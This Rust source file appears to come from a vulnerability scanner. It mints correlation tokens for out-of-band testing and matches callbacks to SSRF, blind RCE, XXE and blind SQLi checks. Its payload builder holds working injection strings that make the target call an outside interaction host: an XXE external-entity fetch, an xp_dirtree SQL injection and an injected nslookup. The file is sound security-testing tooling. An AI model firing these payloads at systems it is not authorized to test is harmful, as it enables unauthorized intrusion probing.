//! Out-of-band (OOB) interaction validation for blind vulnerabilities — SSRF,
//! blind RCE, XXE/OOB, and blind SQLi (Phase 2/3 validation layer).
//!
//! FableScope's "no VPS required" design: an [`OobProvider`] supplies a base
//! interaction domain (public Interactsh, Burp Collaborator, or a user webhook);
//! this crate mints a unique correlation token per test case, builds *safe*,
//! authorized payload templates that phone home to `<token>.<provider-domain>`,
//! and deterministically matches incoming callbacks back to the exact test. A
//! callback alone never confirms: the token must match a registered correlation.
//!
//! Pure/offline core — no network. Provider polling is abstracted behind a
//! trait so live providers plug in without changing the validation logic.

use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use std::collections::BTreeMap;
use uuid::Uuid;

/// Vulnerability class an OOB payload targets.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum OobClass {
    Ssrf,
    BlindRce,
    Xxe,
    BlindSqli,
    DnsPingback,
}

/// A registered test-case correlation. The `token` is the subdomain label that
/// appears in callbacks; everything else ties it back to the exact test.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Correlation {
    pub id: Uuid,
    pub token: String,
    pub class: OobClass,
    pub target: String,
    pub check_id: Option<String>,
    pub payload_hash: String,
    pub created_at: DateTime<Utc>,
}

/// An interaction callback observed by a provider.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Callback {
    /// Full interaction host, e.g. `abc123.oob.example.net`.
    pub host: String,
    pub protocol: String, // dns, http, smtp
    pub source_ip: Option<String>,
    pub at: DateTime<Utc>,
    pub raw: Option<String>,
}

/// A confirmed OOB interaction: a callback matched to its correlation.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct ConfirmedInteraction {
    pub correlation: Correlation,
    pub callback: Callback,
}

/// Abstract OOB provider: supplies the interaction base domain and (for live
/// providers) polls for callbacks. The core validation logic never calls the
/// network directly — it goes through this trait.
pub trait OobProvider {
    /// Human name, e.g. "interactsh".
    fn name(&self) -> &str;
    /// The base interaction domain that tokens are prefixed onto.
    fn base_domain(&self) -> &str;
    /// Whether this provider can actually receive callbacks (vs. disabled/local).
    fn is_active(&self) -> bool {
        true
    }
}

/// A no-infrastructure provider: records a base domain but is marked inactive so
/// blind checks are reported as "blocked/not-run" unless a live provider is set.
pub struct NullProvider;
impl OobProvider for NullProvider {
    fn name(&self) -> &str {
        "disabled"
    }
    fn base_domain(&self) -> &str {
        "oob.invalid"
    }
    fn is_active(&self) -> bool {
        false
    }
}

/// A simple provider wrapping a fixed base domain (e.g. an Interactsh/Collaborator
/// domain the user has configured).
pub struct StaticProvider {
    pub name: String,
    pub domain: String,
    pub active: bool,
}
impl OobProvider for StaticProvider {
    fn name(&self) -> &str {
        &self.name
    }
    fn base_domain(&self) -> &str {
        &self.domain
    }
    fn is_active(&self) -> bool {
        self.active
    }
}

fn token() -> String {
    // 20 hex chars: DNS-label-safe, collision-resistant for a correlation token.
    Uuid::new_v4().simple().to_string()[..20].to_string()
}

fn hash(s: &str) -> String {
    let mut h = Sha256::new();
    h.update(s.as_bytes());
    hex::encode(&h.finalize()[..8])
}

/// The correlation registry + payload minting. Serializable so a host can
/// persist outstanding correlations between a mint and a later callback match.
#[derive(Default, Serialize, Deserialize)]
pub struct OobEngine {
    correlations: BTreeMap<String, Correlation>, // token -> correlation
}

impl OobEngine {
    pub fn new() -> Self {
        Self::default()
    }

    /// Mint a correlation + safe payload for a test case against a provider.
    /// Returns `None` if the provider is inactive (blind check is blocked).
    pub fn mint(
        &mut self,
        provider: &dyn OobProvider,
        class: OobClass,
        target: &str,
        check_id: Option<String>,
    ) -> Option<OobPayload> {
        if !provider.is_active() {
            return None;
        }
        let tok = token();
        let interaction_host = format!("{tok}.{}", provider.base_domain());
        let payload = build_payload(class, &interaction_host);
        let corr = Correlation {
            id: Uuid::new_v4(),
            token: tok.clone(),
            class,
            target: target.to_string(),
            check_id,
            payload_hash: hash(&payload),
            created_at: Utc::now(),
        };
        self.correlations.insert(tok.clone(), corr.clone());
        Some(OobPayload { correlation: corr, interaction_host, payload })
    }

    pub fn active_count(&self) -> usize {
        self.correlations.len()
    }

    /// Deterministically match a callback to a registered correlation by token.
    /// A callback with no matching token is ignored (no false confirmation).
    pub fn match_callback(&self, cb: &Callback) -> Option<ConfirmedInteraction> {
        let host = cb.host.to_lowercase();
        for (tok, corr) in &self.correlations {
            if host.contains(tok.as_str()) {
                return Some(ConfirmedInteraction { correlation: corr.clone(), callback: cb.clone() });
            }
        }
        None
    }

    /// Match a batch of callbacks, returning all confirmed interactions.
    pub fn match_all(&self, callbacks: &[Callback]) -> Vec<ConfirmedInteraction> {
        callbacks.iter().filter_map(|c| self.match_callback(c)).collect()
    }
}

/// A minted payload bundle: the correlation, the interaction host, and the
/// ready-to-use (safe, authorized) payload string.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct OobPayload {
    pub correlation: Correlation,
    pub interaction_host: String,
    pub payload: String,
}

/// Build a safe, authorized OOB payload that only causes an outbound
/// interaction (DNS/HTTP ping) to the correlation host — never a destructive
/// action. These are detection primitives, not exploitation payloads.
fn build_payload(class: OobClass, host: &str) -> String {
    match class {
        OobClass::Ssrf => format!("http://{host}/"),
        OobClass::DnsPingback => host.to_string(),
        OobClass::BlindRce => format!("nslookup {host}"),
        OobClass::Xxe => format!(
            "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % ex SYSTEM \"http://{host}/x.dtd\"> %ex;]><r>&send;</r>"
        ),
        OobClass::BlindSqli => format!("';EXEC master..xp_dirtree '//{host}/a';--"),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn provider() -> StaticProvider {
        StaticProvider { name: "test".into(), domain: "oob.example.net".into(), active: true }
    }

    #[test]
    fn inactive_provider_blocks_blind_check() {
        let mut eng = OobEngine::new();
        assert!(eng.mint(&NullProvider, OobClass::Ssrf, "https://t/", None).is_none());
    }

    #[test]
    fn mint_embeds_token_in_payload() {
        let mut eng = OobEngine::new();
        let p = eng.mint(&provider(), OobClass::Ssrf, "https://t/?url=", Some("FS-WEB-004".into())).unwrap();
        assert!(p.payload.contains(&p.correlation.token));
        assert!(p.interaction_host.ends_with("oob.example.net"));
        assert_eq!(eng.active_count(), 1);
    }

    #[test]
    fn callback_with_token_confirms() {
        let mut eng = OobEngine::new();
        let p = eng.mint(&provider(), OobClass::DnsPingback, "https://t/", None).unwrap();
        let cb = Callback { host: format!("{}.oob.example.net", p.correlation.token), protocol: "dns".into(), source_ip: Some("1.2.3.4".into()), at: Utc::now(), raw: None };
        let confirmed = eng.match_callback(&cb).unwrap();
        assert_eq!(confirmed.correlation.id, p.correlation.id);
    }

    #[test]
    fn unrelated_callback_does_not_confirm() {
        let mut eng = OobEngine::new();
        eng.mint(&provider(), OobClass::Ssrf, "https://t/", None).unwrap();
        let cb = Callback { host: "someoneelse.oob.example.net".into(), protocol: "http".into(), source_ip: None, at: Utc::now(), raw: None };
        assert!(eng.match_callback(&cb).is_none());
    }

    #[test]
    fn payloads_are_detection_only() {
        // RCE primitive is a benign nslookup, not a destructive command.
        let mut eng = OobEngine::new();
        let p = eng.mint(&provider(), OobClass::BlindRce, "https://t/", None).unwrap();
        assert!(p.payload.starts_with("nslookup "));
        assert!(!p.payload.contains("rm ") && !p.payload.contains("del "));
    }

    #[test]
    fn match_all_batches() {
        let mut eng = OobEngine::new();
        let a = eng.mint(&provider(), OobClass::Ssrf, "a", None).unwrap();
        let b = eng.mint(&provider(), OobClass::Xxe, "b", None).unwrap();
        let cbs = vec![
            Callback { host: format!("{}.oob.example.net", a.correlation.token), protocol: "http".into(), source_ip: None, at: Utc::now(), raw: None },
            Callback { host: format!("{}.oob.example.net", b.correlation.token), protocol: "http".into(), source_ip: None, at: Utc::now(), raw: None },
            Callback { host: "noise.oob.example.net".into(), protocol: "dns".into(), source_ip: None, at: Utc::now(), raw: None },
        ];
        assert_eq!(eng.match_all(&cbs).len(), 2);
    }
}
